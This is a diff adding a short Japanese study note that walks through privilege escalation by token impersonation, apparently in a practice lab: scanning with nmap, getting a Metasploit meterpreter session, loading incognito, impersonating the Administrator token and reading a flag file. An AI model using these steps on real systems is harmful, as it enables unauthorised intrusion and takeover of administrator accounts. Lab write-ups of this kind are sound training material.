@@ -1,0 +1,16 @@
+権限昇格：なりすまし
+1) nmapを使って、セキュリティホールを探索する
+2) searchsploit サービス名で、ローカルにexploitが存在するか確認する。
+3) service postgresql start && msfconsole
+4) search でモジュールを探索する
+5) useでモジュールを起動する
+6) setで基本情報を設定する
+7) exploitでmeterpreterの権限を奪う
+8) getuidで権限を確認する
+9) 以下のコマンドで、シークレットプラグインをロードし、利用可能なトークンを見る
+load incognito
+list_tokens -u
+10) 以下のコマンドで、管理者ユーザートークンを偽装し、フラグを読み取る
+impersonate_token ATTACKDEFENCE\\Administrator
+getuid
+cat C:\\Users\\Administrator\\Desktop\\flag.txt
